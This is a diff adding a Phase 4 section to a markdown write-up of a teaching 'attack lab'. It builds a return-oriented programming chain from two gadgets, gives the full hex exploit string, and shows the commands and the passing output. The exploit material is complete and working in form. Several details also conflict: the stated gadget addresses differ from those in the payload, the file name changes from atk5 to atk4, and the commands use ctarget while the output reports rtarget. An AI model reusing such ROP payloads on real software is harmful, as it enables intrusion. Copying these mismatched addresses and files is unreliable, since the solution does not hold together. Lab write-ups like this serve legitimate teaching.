@@ -744,3 +744,66 @@ This phase is the same as phase 2 except using different method to call touch2 a
 All the gadgets we need should be found in the region of the code for rtarget demarcated by the
 functions start_farm and mid_farm. Only two gadgets can be used to do the attack. 
 
+First we need to find bytes to pass the cookie to %rdi. Because `5f` which represent `popq %rdi` cannot be found between start_farm and end_farm in the dump file, we use `popq %rax` for a substitute and pass it to %rdi after that. So our code can be
+
+```
+popq     %rax
+ret                  
+mov      %rax,%rdi
+ret
+```
+
+In the disassembled code of `rtatget` we can find `58 (90) c3` at 0x1b23 which represent `popq %rax` and `ret` as gadget 1
+
+> The code in the () can be ignored because it represents `nop` and has no influence on the rest codes.
+>
+> When running the program in my computer the address will become 0x0000555555555b23 .
+
+```
+0000000000001b0f <setval_119>:      /* when running the program the address will be 0x0000555555555b0f */
+    1b0f:	c7 07 2e c6 58 90    	movl   $0x9058c62e,(%rdi)
+    1b15:	c3                   	retq   
+```
+
+and `48 89 c7 c3` at 0x1b2c which represent `mov %rax,%rdi` and `ret`  as gadget 2
+
+> The transition of address is similar to notes above
+
+```
+0000000000001b29 <addval_186>:
+    1b29:	8d 87 e3 48 89 c7    	lea    -0x3876b71d(%rdi),%eax
+    1b2f:	c3                   	retq 
+```
+
+Now we can use these 2 gabgets to create our file `atk5.txt`
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00            /* padding */
+13 5b 55 55 55 55 00 00            /* gadget 1 */
+4e d7 5b 5f 00 00 00 00            /* cookie to be popped into %rax */
+24 5b 55 55 55 55 00 00            /* gadget 2 */
+93 59 55 55 55 55 00 00            /* touch2 address */
+```
+
+Let's check our solution
+
+```
+./hex2raw < atk4.txt > atk4r.txt
+
+./ctarget < atk4r.txt             # use I/O redirection
+
+gdb ctarget                 # within GDB
+(gdb) run < atk4r.txt
+```
+
+```
+Cookie: 0x5f5bd74e
+Type string:Touch2!: You called touch2(0x5f5bd74e)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
+
+<h3 id = "phase5">Phase 5</h3>
